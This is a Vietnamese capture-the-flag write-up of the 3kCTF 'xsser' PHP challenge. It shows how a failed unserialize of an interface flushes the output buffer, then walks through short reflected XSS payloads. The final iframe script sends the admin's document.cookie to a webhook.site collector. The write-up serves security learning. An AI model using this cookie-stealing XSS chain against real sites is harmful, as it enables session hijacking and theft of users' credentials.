---
title: xsser - 3kCTF
date: 2020-07-29
description: ""
categories:
  - CTF
tags:
  - xss
  - web
  - php
menu: main
---
Nguồn: <https://ctftime.org/writeup/22594>

Truy cập vào đường link <http://xsser.3k.ctf.to/> trang sẽ tự chuyển hướng thành [http://xsser.3k.ctf.to/?**login=O:4:"User":2:{s:4:"name";s:5:"guest";s:7:"isAdmin";b:0;}**](http://xsser.3k.ctf.to/?login=O:4:"User":2:{s:4:"name";s:5:"guest";s:7:"isAdmin";b:0;})

và đây là nội dung file index.php

```php
<?php
include('flag.php');
class User

{
    public $name;
    public $isAdmin;
    public function __construct($nam)
    {
        $this->name = $nam;
        $this->isAdmin=False;
    }
}

ob_start();
if(!(isset($_GET['login']))){
    $use=new User('guest');
    $log=serialize($use);
    header("Location: ?login=$log");
    exit();

}

$new_name=$_GET['new'];
if (isset($new_name)){

  if(stripos($new_name, 'script'))//no xss :p
                 {
                    $new_name = htmlentities($new_name);
                 }
        $new_name = substr($new_name, 0, 32);
  echo '<h1 style="text-align:center">Error! Your msg '.$new_name.'</h1><br>';
  echo '<h1>Contact admin /req.php </h1>';

}
 if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
            setcookie("session", $flag, time() + 3600);
        }
$check=unserialize(substr($_GET['login'],0,56));
if ($check->isAdmin){
    echo 'welcome back admin ';
}
ob_end_clean();
show_source(__FILE__);
```

Thoạt nhìn có thể khai thác được xss thông qua `$_GET['new']` , nhưng nó nằm trong `ob_start()` và `ob_end_clean()` ( lưu output vào buffer và clean) nên dù có khai thác được xss thì `$_GET['new']` cũng không được in ra trình duyệt.

Nhưng khoan, vậy thì hàm `htmlentities()` chống xss để làm gì.

Dạo một vòng php documentation thì phát hiện [ob_start()#108016](https://www.php.net/manual/en/function.ob-start.php#108016), cụ thể khi có lỗi throw ra trong buffer thì nó in ra tất cả những gì đang có trong buffer.

Vì vậy ta nên khai thác lỗi các hàm khác để buffer được in ra, từ đó khai thác tiếp xss.

[unserialize()#112894](https://www.php.net/manual/en/function.unserialize.php#112894) cho ta biết nếu object truyền vào không thể khởi tạo (Abstract Class hoặc Interface) thì sẽ throw lỗi. Vậy nên ta xây dựng payload là một string đã serialized.

Dựa trên [unserialize()#66147](https://www.php.net/manual/en/function.serialize.php#66147) để build một payload: `O:8:"Iterator":0:{}` truyền vào `$_GET['login']`

Nhận thấy `htmlentities()` chỉ thực thi khi phát hiện `'script'` truyền vào. Vậy ta sẽ dùng payload inline xss: `<svg/onload=alert(1)>` truyền vào `$_GET['new']`

Truy cập: [http://xsser.3k.ctf.to/?login=O:8:"Iterator":0:{}&new=<svg/onload=alert(1)>](http://xsser.3k.ctf.to/?login=O:8:%22Iterator%22:0:%7B%7D&new=%3Csvg/onload=alert(1)%3E)

Kết quả:

![XSS exploited](/img/untitled.png)

Vậy là chạy được script tiêm vào. Nhưng script bị giới hạn chỉ 32 kí tự, và không dùng được script tag. Tìm payload ngắn nhất trên google ra được [bài này](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/).

Chúng ta có 2 lựa chọn:

1. Có một domain 4 kí tự trở xuống chứa script `<svg/onload=import('xxxx.yy')>`
2. Lưu script vào `window.name` rồi thực thi `<svg/onload=eval(name)>`

Mình chọn cách 2 vì đơn giản hơn. Việc còn lại là lấy được `$flag` thông qua cookie của admin

```php
 if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
            setcookie("session", $flag, time() + 3600);
```

Như chúng ta thấy cookie chỉ được set khi địa chỉ truy cập là `127.0.0.1` tức là `localhost` vậy khi viết script chúng ta sẽ trỏ tới `127.0.0.1` thay vì `xsser.3k.ctf.to`

Bạn cần host script của bạn và submit vào <http://xsser.3k.ctf.to/req.php> để admin truy cập.

Mình thích dùng [repl.it](http://repl.it) để host code, vì thằng này có thể chạy được `http` và cả `https` mà không bị chuyển hướng như [codesandbox.io](http://codesandbox.io). Và tất nhiên [webhook.site](https://webhook.site/) chuyển hướng cookie về và log lại

```html
<iframe id="xss" src="http://127.0.0.1/"></iframe>
<script>
  document.getElementById("xss").onload = function () {
    setTimeout(function () {
      window.open(
        "http://127.0.0.1/?login=O:11:%22Traversable%22:0:{}&new=%3Csvg/onload=eval(name)%3E",
        'window.location.href = "https://webhook.site/2efe831e-5b4e-43f2-a800-9734dd41d367?"+document.cookie'
      );
    });
  };
</script>
```

Copy link để submit nhớ bỏ `https` Link có dạng [http://ImmediateLavishCallbacks--five-nine.repl.co](https://immediatelavishcallbacks--five-nine.repl.co/)

![Submit XSS to Admin](/img/untitled-1.png)

Có một điều thú vị là script sẽ chạy nếu như click thẳng vào link. Còn nhập link vào trình duyệt thì Chrome sẽ tự phát hiện popup và chặn. Vậy nên `window.open()` sẽ không dùng được. Các bạn có thể dùng cách khác là tạo `<a href={link xss} target={window.name}>` và dùng javascript để click vào link đó.

Như vậy là thành công

![Get cookie successfully](/img/untitled-2.png)